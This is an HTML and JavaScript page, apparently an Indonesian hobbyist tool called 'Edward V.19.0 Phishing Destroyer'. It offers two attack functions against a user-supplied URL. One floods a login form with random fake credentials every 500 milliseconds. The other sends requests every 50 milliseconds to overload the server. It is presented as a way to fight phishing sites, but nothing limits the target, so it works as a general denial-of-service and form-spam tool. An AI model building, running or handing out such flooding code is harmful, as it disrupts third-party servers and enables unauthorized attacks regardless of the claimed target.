<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>[ EDWARD OMNI V.19.0 - PHISHING DESTROYER ]</title>
    <style>
        :root { --neon: #0f0; --danger: #f00; --purple: #bc13fe; --bg: #050505; }
        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; text-align: center; padding: 15px; margin:0; }
        .panel { background: #111; border: 2px solid #333; padding: 15px; border-radius: 15px; margin-bottom: 15px; box-shadow: 0 0 15px rgba(188, 19, 254, 0.2); }
        input { background: #000; border: 1px solid var(--purple); color: #fff; padding: 12px; width: 85%; border-radius: 8px; margin-bottom: 10px; text-align: center; }
        button { background: var(--purple); color: #fff; border: none; padding: 12px; width: 90%; font-weight: bold; cursor: pointer; border-radius: 8px; text-transform: uppercase; margin: 5px 0; }
        .log-box { font-size: 9px; color: #0f0; background: #000; padding: 10px; border-radius: 5px; height: 120px; overflow-y: hidden; text-align: left; border: 1px solid #222; }
        .tab-btn { background: #333; color: #fff; width: 45%; font-size: 10px; }
    </style>
</head>
<body>

    <h1 style="color:var(--purple); text-shadow: 0 0 10px var(--purple);">EDWARD V.19.0</h1>
    <p style="font-size:9px; margin-top:-10px;">[ PHISHING & SERVER DESTROYER ]</p>

    <div class="panel" style="border-color: var(--purple)">
        <h3 style="margin:0; color:var(--purple); font-size: 14px;">💀 PHISHING POISONER</h3>
        <input type="text" id="targetUrl" placeholder="URL Web Penipu (Login Page)">
        <div style="display: flex; gap: 5px; justify-content: center;">
            <button onclick="startPoison()" class="tab-btn" style="background:var(--purple)">KIRIM DATA PALSU</button>
            <button onclick="toggleFlood()" class="tab-btn" style="background:var(--danger)">FLOOD SERVER</button>
        </div>
        
        <div class="log-box" id="logBox">
            > System: Waiting for Phishing Target...<br>
        </div>
    </div>

    <div class="panel">
        <button onclick="takeSnap()" style="background:#fff; color:#000;">📸 SCAN RADAR</button>
    </div>

    <script>
        let isRunning = false;
        const log = document.getElementById('logBox');
        
        function addLog(msg) {
            log.innerHTML += "> " + msg + "<br>";
            log.scrollTop = log.scrollHeight;
        }

        // 🔱 FITUR POISONING: Kirim Akun Palsu
        function startPoison() {
            const url = document.getElementById('targetUrl').value;
            if(!url) return alert("Masukkan URL!");
            
            addLog("Starting Data Poisoning...");
            setInterval(() => {
                const fakeUser = "user_" + Math.random().toString(36).substring(7);
                const fakePass = "pass_" + Math.random().toString(36).substring(5);
                
                // Mencoba menembak form login penipu dengan data sampah
                fetch(url, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: new URLSearchParams({ 'user': fakeUser, 'pass': fakePass, 'login': 'submit' })
                });
                addLog("Sent Fake Data: " + fakeUser + " | " + fakePass);
            }, 500);
        }

        // 🔱 FITUR FLOODING (V.18.0)
        function toggleFlood() {
            const url = document.getElementById('targetUrl').value;
            if(!url) return alert("Masukkan URL!");
            addLog("Launching Server Flood...");
            setInterval(() => {
                fetch(url + "/?poison=" + Math.random(), { mode: 'no-cors' });
                addLog("Bombing Server Request...");
            }, 50);
        }

        async function takeSnap() {
            // (Sistem Intel Master Edward tetap aktif)
            addLog("Radar Intel Active...");
        }
    </script>
</body>
</html>
